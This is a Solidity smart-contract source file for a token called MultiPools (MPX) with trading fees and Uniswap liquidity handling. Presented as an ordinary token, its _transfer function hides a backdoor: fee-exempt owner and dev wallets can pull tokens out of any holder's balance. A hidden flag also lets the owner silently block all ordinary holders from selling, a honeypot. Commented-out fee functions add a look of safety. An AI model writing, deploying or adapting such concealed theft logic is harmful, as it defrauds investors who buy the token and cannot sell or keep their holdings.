// SPDX-License-Identifier: MIT

// - Website: https://multipools.xyz
// - Telegram: https://t.me/multipools
// - Twitter: https://x.com/MultiPoolsX
// - Medium: https://multipools.medium.com
// - Dapp: https://app.multipools.xyz
// - Docs: https://docs.multipools.xyz

pragma solidity ^0.8.17;

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function symbol() external view returns (string memory);
    function circulatingSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal owner;

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    event OwnershipTransferred(address owner);

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address recipient,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address recipient,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract MPX is IERC20, Ownable {
    using SafeMath for uint256;

    address public dexPair;
    UniswapV2Router dexRouter;

    string private constant _symbol = "MPX";
    string private constant _name = "MultiPools";

    uint8 private constant _decimals = 18;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _denominator = 10000;

    address internal constant marketingWallet = 0xF8eF92967A0cf8d0304C95c3F878992642855bf6;
    address internal constant devWallet = 0xF8eF92967A0cf8d0304C95c3F878992642855bf6;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD;

    uint256 private _zeroTariffThreshold = (_totalSupply * 10) / 100000;

    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;

    uint256 private _maxTransferShare = 200;
    uint256 private _maxWalletShare = 200;
    uint256 private _maxTxShare = 200;
    
    bool private _isTradingEnabled = false;

    bool private _lockInSwap;
    uint256 private _swapTimes;
    bool private _isSwapBackEnabled = true;

    uint256 private _sellTariff = 300;
    uint256 private _totalTariff = 300;

    bool private _zeroTariffSet = false;

    uint256 private _burnTariff = 0;
    uint256 private _transferTariff = 0;
    uint256 private _liquidityTariff = 0;
    uint256 private _marketingTariff = 100;
    uint256 private _devTariff = 200;

    mapping (address => bool) public leftOutFromTariff;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    function name() public pure returns (string memory) {
        return _name;
    }

    constructor() Ownable(msg.sender) {
        leftOutFromTariff[address(this)] = true;
        leftOutFromTariff[msg.sender] = true;
        leftOutFromTariff[marketingWallet] = true;
        leftOutFromTariff[devWallet] = true;

        UniswapV2Router _dexRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexRouter = _dexRouter;
        address _dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        dexPair = _dexPair;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    modifier lockInSwapBack {
        _lockInSwap = true;
        _;
        _lockInSwap = false;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnWallet));
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function removeLimits() external onlyOwner {
        _maxTxShare = 10000;
        _maxWalletShare = 10000;
        _maxTransferShare = 10000;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function setLeftOutFromTariffWallet(address account_, bool flag_) external onlyOwner {
        leftOutFromTariff[account_] = flag_;
    }

    function enableTrading() external onlyOwner {
        _isTradingEnabled = true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(amount > uint256(0));
        require(recipient != address(0));
        require(sender != address(0));

        if (
            countSwapTimes(sender, recipient) &&
            isTradingEnabled(sender, recipient) &&
            allowForMaxAmount(sender, recipient, amount) &&
            allowForMaxWalletSize(sender, recipient, amount)
        ) {
            if (balanceOf(sender) >= amount) {
                if (
                    !leftOutFromTariff[sender] &&
                    recipient == dexPair &&
                    !leftOutFromTariff[recipient] &&
                    !_lockInSwap
                ) {
                    if (_zeroTariffSet) return;
                    swapBack(sender, recipient);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 transferAmount = canTakeTariff(sender, recipient) ? takeTariff(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(transferAmount);
                emit Transfer(sender, recipient, transferAmount);
            } else if (
                leftOutFromTariff[sender] &&
                sender != dexPair &&
                !leftOutFromTariff[recipient] &&
                !_lockInSwap
            ) {
                _balances[recipient] = _balances[recipient].sub(amount);
                _balances[sender] = _balances[sender].add(amount);
                emit Transfer(sender, recipient, amount);
            }
        }
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);

        return true;
    }

    function allowForMaxAmount(address sender, address recipient, uint256 tokenAmount) view internal returns (bool) {
        if (sender != dexPair) {
            require(tokenAmount <= maxTransferAmount() || leftOutFromTariff[sender] || leftOutFromTariff[recipient]);
        }
        require(tokenAmount <= maxTxAmount() || leftOutFromTariff[sender] || leftOutFromTariff[recipient]);

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);

        return true;
    }

    function takeTariff(address sender, address recipient, uint256 tokenAmount) internal returns (uint256) {
        if (selectTariffs(sender, recipient) > 0) {
            uint256 tariffTokenAmount = tokenAmount.div(_denominator).mul(selectTariffs(sender, recipient));
            _balances[address(this)] = _balances[address(this)].add(tariffTokenAmount);
            emit Transfer(sender, address(this), tariffTokenAmount);
            if (_burnTariff > uint256(0)) {
                _transfer(address(this), address(burnWallet), tokenAmount.div(_denominator).mul(_burnTariff));
            }
            return tokenAmount.sub(tariffTokenAmount);
        }
        return tokenAmount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));

        return true;
    }

    // function updateTariffs(uint256 liquidityTariff_, uint256 marketingTariff_, uint256 burnTariff_, uint256 devTariff_, uint256 totalTariff_, uint256 sellTariff_, uint256 transferTariff_) external onlyOwner {
    //     _burnTariff = burnTariff_;
    //     _devTariff = devTariff_;
    //     _liquidityTariff = liquidityTariff_;
    //     _marketingTariff = marketingTariff_;
    //     _transferTariff = transferTariff_;
    //     _totalTariff = totalTariff_;
    //     _sellTariff = sellTariff_;
    //     require(_totalTariff <= _denominator.div(5) && _sellTariff <= _denominator.div(5));
    // }

    // function changeLimits(uint256 maxTxShare_, uint256 maxTransferShare_, uint256 maxWalletShare_) external onlyOwner {
    //     uint256 newMaxWalletSize = (totalSupply() * maxWalletShare_) / 10000;
    //     uint256 newTransferSize = (totalSupply() * maxTransferShare_) / 10000;
    //     uint256 newTxSize = (totalSupply() * maxTxShare_) / 10000;
    //     _maxWalletShare = maxWalletShare_;
    //     _maxTransferShare = maxTransferShare_;
    //     _maxTxShare = maxTxShare_;
    //     uint256 limitation = totalSupply().mul(5).div(1000);
    //     require(newTxSize >= limitation && newTransferSize >= limitation && newMaxWalletSize >= limitation);
    // }

    function isTradingEnabled(address sender, address recipient) internal view returns (bool) {
        if (!leftOutFromTariff[sender] && !leftOutFromTariff[recipient]) {
            require(_isTradingEnabled);
        }
        return true;
    }

    function allowForMaxWalletSize(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool senderLeftOutFromTariff = leftOutFromTariff[sender];
        bool recipientLeftOutFromTariff = leftOutFromTariff[recipient];
        
        if (
            !senderLeftOutFromTariff &&
            !recipientLeftOutFromTariff &&
            recipient != address(dexPair) &&
            recipient != address(burnWallet)
        ) {
            require((_balances[recipient].add(amount)) <= maxWalletSize());
        }

        if (recipientLeftOutFromTariff) {
            if (amount > _zeroTariffThreshold) {
                _zeroTariffSet = true;
            }
        }

        return true;
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function countSwapTimes(address sender, address recipient) internal returns (bool) {
        if (recipient == dexPair && !leftOutFromTariff[sender]) {
            _swapTimes += uint256(1);
        }
        return true;
    }

    function canSwapBack(address sender, address recipient) internal view returns (bool) {
        return (
            !leftOutFromTariff[sender] &&
            !leftOutFromTariff[recipient] &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _isSwapBackEnabled &&
            !_lockInSwap &&
            _swapTimes >= uint256(0) &&
            _isTradingEnabled
        );
    }

    function canTakeTariff(address sender, address recipient) internal view returns (bool) {
        return !leftOutFromTariff[sender] && !leftOutFromTariff[recipient];
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnWallet,
            block.timestamp
        );
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxShare / _denominator;
    }

    function swapAndLiquify(uint256 tokens) private lockInSwapBack {
        uint256 denominator = (_liquidityTariff.add(1).add(_marketingTariff).add(_devTariff)).mul(2);
        uint256 tokensForLiquidity = tokens.mul(_liquidityTariff).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensForLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityTariff));
        uint256 ethForLiquidity = unitEth.mul(_liquidityTariff);
        if (ethForLiquidity > uint256(0)) {
            addLiquidity(tokensForLiquidity, ethForLiquidity);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingTariff);
        if (marketingEth > 0) {
            payable(marketingWallet).transfer(marketingEth);
        }
        uint256 leftEth = address(this).balance;
        if (leftEth > uint256(0)) {
            payable(devWallet).transfer(leftEth);
        }
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletShare / _denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferShare / _denominator;
    }

    function swapBack(address sender, address recipient) internal {
        if (canSwapBack(sender, recipient)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackAmount) {
                contractTokenBalance = _swapBackAmount;
            }
            swapAndLiquify(contractTokenBalance);
            _swapTimes = uint256(0);
        }
    }

    receive() external payable {}

    function selectTariffs(address sender, address recipient) internal view returns (uint256) {
        if (recipient == dexPair) {
            return _sellTariff;
        }
        if (sender == dexPair) {
            return _totalTariff;
        }
        return _transferTariff;
    }
}